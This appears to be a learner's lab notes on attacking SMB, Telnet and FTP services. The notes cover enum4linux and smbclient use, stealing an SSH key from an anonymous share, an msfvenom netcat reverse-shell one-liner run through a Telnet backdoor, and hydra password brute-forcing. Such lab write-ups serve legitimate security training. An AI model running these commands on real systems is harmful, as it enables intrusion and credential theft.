@@ -1,0 +1,270 @@
+-------
+SMB
+-------
+
+What is SMB?
+
+SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [source]
+
+Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.
+
+The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.
+
+How does SMB work?
+
+Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.
+
+What runs SMB?
+
+Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.
+
+-------------
+Enumeration:-
+-------------
+
+Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.
+
+This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.
+
+SMB
+
+Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares. 
+
+Port Scanning
+
+The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.
+
+If you haven't already looked at port scanning, I recommend checking out the Nmap room here.
+
+Enum4Linux
+
+Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's already installed on the AttackBox, however if you need to install it on your own attacking machine, you can do so from the official github.
+
+The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"
+
+TAG            FUNCTION
+
+-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+
+-a             all of the above (full basic enumeration)
+
+----------
+Exploite:-
+----------
+
+Types of SMB Exploit
+
+While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.
+
+Method Breakdown
+
+So, from our enumeration stage, we know:
+
+    - The SMB share location
+
+    - The name of an interesting SMB share
+
+SMBClient
+
+Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it’s already installed on the AttackBox, if you do need to install it on your own attacking machine, you can find the documentation here.
+
+We can remotely access the SMB share using the syntax:
+
+Syntax: smbclient //[IP]/[SHARE] -U [USERNAME] -p [PORT]
+
+Example: smbclient //10.10.10.10/secrets -U Anonymous -p 445
+
+SMBClient Commands
+
+Once inside the share, you can view the available commands by typing "help". The most useful of which are:
+
+    ls or dir: List files and directories
+    cd [DIR]: Move to a different directory
+    get [FILE]: Download the file to your AttackBox
+    
+ex lab:-
+first find the server there running smb services than enumarate ports and os servisec and etc....
+using nmap, enum4linux, etc..
+open that port for uses smb servises 
+like:- smbclient //ip/share dir -U username -p port
+ex:-smbclient //10.10.127.163/profiles dir -U anonymous -p 445
+this will enter the login stage than we show the password required for uses servises.
+we need to enumarate password using techniq or using guaseble password, here we enter password right or wrong that will enter us to the server.
+here we need to find a services that server runs and key and username that will help us to login in server
+here server uses .ssh service  go to the .ssh
+cd .ssh
+here we show the key and username that will help to enter into server
+we using mget command download file of key and mv to the over .ssh file and also .ssh file hidden show we need to use terminal or serach parameter of file like /root/.ssh
+after complete all prosess we need to open terminal on .ssh folder
+type:-ssh username@ip of server
+ex:-ssh cactus@10.10.127.163
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+---------
+TELNET
+---------
+
+What is Telnet?
+
+Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
+
+The telnet client will establish a connection with the server. The client will then become a virtual terminal - allowing you to interact with the remote host.
+
+Replacement
+
+Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH where transmitted data is encrypted.
+ 
+How does Telnet work?
+
+The user connects to the server by using the Telnet protocol, which means entering "telnet" into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: "telnet [ip] [port]"
+
+ex:-
+enumaration
+
+using nmap and enum4linux we find the open ports and what service and os and etc... runing.
+here 8012 port are open for telnet services, so we know the 8012 is uses for backdoor attack.
+
+exploitation:-
+Types of Telnet Exploit
+
+Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:
+
+    https://www.cvedetails.com/
+    https://cve.mitre.org/
+
+A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.
+
+However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.
+
+Method Breakdown:-
+
+So, from our enumeration stage, we know:
+
+    - There is a poorly hidden telnet service running on this machine
+
+    - The service itself is marked "backdoor"
+
+    - We have possible username of "Skidy" implicated
+
+Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!
+
+Connecting to Telnet
+
+You can connect to a telnet server with the following syntax:
+
+    "telnet [ip] [port]"
+
+We're going to need to keep this in mind as we try and exploit this machine.
+
+What is a Reverse Shell?
+
+A "shell" can simply be described as a piece of code or program which can be used to gain code or command execution on a device.
+
+A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.
+
+The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved
+
+ex:-
+ here we uses 3 terminal for make attack successfull.
+ 1.uses for established telnet
+ 2.uses for netcat connection
+ 3.uses for show the connection is established or not
+ 
+we start 1 terminal and typr telnet 10.10.47.174 8012
+   this will established connection and give accses of shell
+   here we just show the any cmd are not working only work is .help, .run, .exit
+   so, we uses one method.
+   
+so we open 3 terminal and type sudo tcpdump ip proto //icmp -i ens5(which uses your machine like eth0, etc..)
+   than we type .run ping ip(ens5) -c 1 on terminal 1
+   than show the 3 terminal get the one packet from telnet service
+   so, inresult we have one attack like reverse shell that using we gain access of telnet shell
+   
+so, we open 2 terminal and type "msfvenom -p cmd/unix/reverse_netcat lhost=[local ens5 ip] lport=4444 R"
+playload explanation:-
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+
+result:-mkfifo /tmp/wanws; nc 10.10.81.157 4444 0</tmp/wanws | /bin/sh >/tmp/wanws 2>&1; rm /tmp/wanws
+
+after making payload we copy the payload and goto the 1 terminal 
+type .run paste
+after enter the payload we goto the 2 terminal and type
+nc -lvnp 4444
+this command listen and send packet to 4444 port 
+than we show the nc is established connection between ourshell and telnet shell
+than type any command and show now you gain access of telnet shell
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+-------
+FTP:-
+-------
+
+we type ftp [ip] for esatablished connection
+
+than enumarate like above methods
+
+exploite:-
+Types of FTP Exploit
+
+Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.
+
+With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.
+
+When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.
+
+Method Breakdown
+
+So, from our enumeration stage, we know:
+
+    - There is an FTP server running on this machine
+
+    - We have a possible username
+
+Using this information, let's try and bruteforce the password of the FTP Server.
+
+Hydra
+
+Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra is already installed on the AttackBox, however, if you need it on your own attacking machine, you can find the GitHub repository here.
+
+The syntax for the command we're going to use to find the passwords is this:
+"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
+
+Let's break it down:
+
+SECTION             FUNCTION
+
+hydra                   Runs the hydra tool
+
+-t 4                    Number of parallel connections per target
+
+-l [user]               Points to the user who's account you're trying to compromise
+
+-P [path to dictionary] Points to the file containing the list of possible passwords
+
+-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+
+[machine IP]            The IP address of the target machine
+
+ftp / protocol          Sets the protocol
+
+ex:-here we show the 
+using ftp [ip] cmd
+they say the enter username than password
+here we enter username=anonymous and password anything 
+here we enter the ftp server here we have access of shell so, we find the some file that says the mike is username of this server
+show we need to type ftp [ip] than username=mike but here this time password are required 
+so we using hydra brute force the password
+
+hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+
+this will give the password of mike than we access of mike ftc connection shell
